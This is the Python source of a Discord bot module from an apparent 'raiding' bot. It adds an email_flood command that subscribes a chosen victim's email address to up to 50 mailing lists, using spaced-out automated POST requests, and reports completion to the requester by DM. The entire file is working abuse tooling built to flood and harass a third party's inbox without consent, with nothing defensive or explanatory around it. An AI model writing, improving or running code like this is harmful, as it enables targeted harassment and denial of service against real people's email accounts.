# email_flooder.py cog
import discord
from discord import app_commands
from discord.ext import commands
from discord.ui import Modal, TextInput
import aiohttp
import asyncio
import random
import json
import os

from utils.raid_logger import rlog
from utils.raid_config import SERVER_INVITE
from utils.access_manager import AccessManager
access = AccessManager()

debug_mode = os.getenv("DEBUG_MODE")

# --------------------------------
# Email Flooder Logic
# --------------------------------
class EmailFlooderLogic:
    @staticmethod
    def load_mailing_lists():
        try:
            if not os.path.exists("mailing_lists.json"):
                return []
            with open("mailing_lists.json", "r") as f:
                data = json.load(f)
                return data.get("mailing_lists", [])
        except Exception as e:
            if debug_mode == "True":
                print("Email Flooder Error:")
                print(f"  Failed to load mailing lists: {e}")
            return []

    @staticmethod
    async def signup_to_mailing_list(email: str, url: str):
        async with aiohttp.ClientSession() as session:
            try:
                # Most mailing lists expect a POST with the email field
                # This is a generic implementation
                async with session.post(url, data={"email": email}, timeout=10) as resp:
                    return resp.status < 400
            except Exception as e:
                if debug_mode == "True":
                    print("Email Flooder Error:")
                    print(f"  Signup failed for {email} to {url}")
                    print(f"  Error: {e}")
                return False

    @staticmethod
    async def flood_email(email: str, count: int, interaction: discord.Interaction):
        mailing_lists = EmailFlooderLogic.load_mailing_lists()
        if not mailing_lists:
            await interaction.followup.send("No mailing lists configured.", ephemeral=True)
            return

        random.shuffle(mailing_lists)
        target_lists = mailing_lists[:count]

        for url in target_lists:
            await EmailFlooderLogic.signup_to_mailing_list(email, url)
            await asyncio.sleep(random.uniform(0.1, 0.5))

        # Send completion embed to user DMs
        try:
            embed = discord.Embed(
                title="Email Flood Complete",
                description=f"Email flood completed successfully.\n\n**Details:**\n- Email: `{email}`\n- Signups: `{len(target_lists)}`",
                color=discord.Color.green()
            )
            embed.set_footer(text="Lucid Rxiding™ | Email Flooder")
            await interaction.user.send(embed=embed)
        except Exception as e:
            if debug_mode == "True":
                print("Email Flooder Error:")
                print(f"  Flood failed for {email}")
                print(f"  Requested by: {interaction.user}")
                print(f"  Error: {e}")

# -----------------------------------
# Email Flooder Modal
# -----------------------------------
class EmailFlooderModal(Modal, title="Email Flooder"):
    email = TextInput(label="Email Address", placeholder="Enter the target email address", required=True)
    count = TextInput(label="Number of Signups", placeholder="Number of mailing lists (1-10)", default="10", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        email = self.email.value
        try:
            count = int(self.count.value)
            if count < 1 or count > 50:
                await interaction.followup.send("Count must be between 1 and 50.", ephemeral=True)
                return
            
            await interaction.followup.send(f"Starting email flood for {email}. Results will be DM'd.", ephemeral=True)
            # Run in background to not block the modal response
            asyncio.create_task(EmailFlooderLogic.flood_email(email, count, interaction))
            
        except ValueError:
            await interaction.followup.send("Invalid count format.", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"An error occurred: {e}", ephemeral=True)
            if debug_mode == "True":
                print("Email Flooder Error:")
                print(f"  Flood failed for {email}")
                print(f"  Requested by: {interaction.user}")
                print(f"  Error: {e}")

# --------------------------------
# Email Flooder Command
# --------------------------------
class EmailFlooderCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="email_flood", description="Flood an email with signups to mailing lists")
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def email_flood(self, interaction: discord.Interaction):
        await rlog(self.bot, "email_flood", interaction.user, interaction.guild_id)
        # Guard check
        guard = await access.guard(interaction, {"action": "email_flood", "cooldown_seconds": 60})
        if not guard.get("ok"):
            reason = str(guard.get("reason", "unknown"))
            msg = {
                "not_authorized": f"You are not authorized to use this bot.\n-# Please join the support server and verify to get access to the bot.\n-# {SERVER_INVITE}",
                "global_locked": "Bot is currently locked.",
                "user_blocked": "You are blocked from using this bot.",
                "rate_limited": f"Wait {guard.get('wait')}s."
            }
            view = discord.ui.LayoutView()
            container = discord.ui.Container(
                discord.ui.TextDisplay(
                    content=f"# ❌️ Access Denied\n{msg.get(reason, 'Access denied.')}"
                )
            )
            view.add_item(container)
            await interaction.response.send_message(view=view, ephemeral=True)
            return
        # End of checks

        await interaction.response.send_modal(EmailFlooderModal())

async def setup(bot):
    await bot.add_cog(EmailFlooderCommands(bot))
